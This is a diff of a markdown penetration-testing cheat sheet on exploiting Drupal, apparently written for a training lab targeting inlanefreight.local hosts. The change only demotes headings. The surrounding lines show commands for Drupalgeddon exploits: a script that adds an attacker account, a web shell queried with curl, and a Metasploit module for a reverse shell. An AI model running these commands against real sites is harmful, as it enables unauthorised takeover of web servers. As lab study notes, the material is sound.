@@ -13,7 +13,7 @@ droopescan scan drupal -u http://drupal.inlanefreight.local
 ```
 ### Attack
 
-## Drupalgeddon
+#### Drupalgeddon
 
 Adds a new user for version 7.31 and below
 
@@ -22,7 +22,7 @@ Adds a new user for version 7.31 and below
 ```bash
 python2.7 34992.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
 ```
-## Drupalgeddon2
+#### Drupalgeddon2
 
 Affects Druple < 8.3.9 / < 8.4.6 / < 8.5.1
 
@@ -66,7 +66,7 @@ curl -s http://drupal-dev.inlanefreight.local/shell.php?cmd=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-## Drupalgeddon3
+#### Drupalgeddon3
 
 Use the Metasploit module `multi/http/drupal_drupageddon3`. For this we need to use the `
 `drupal_session` which can be obtained from a valid login session. From there, it is possible to obtain a reverse shell.
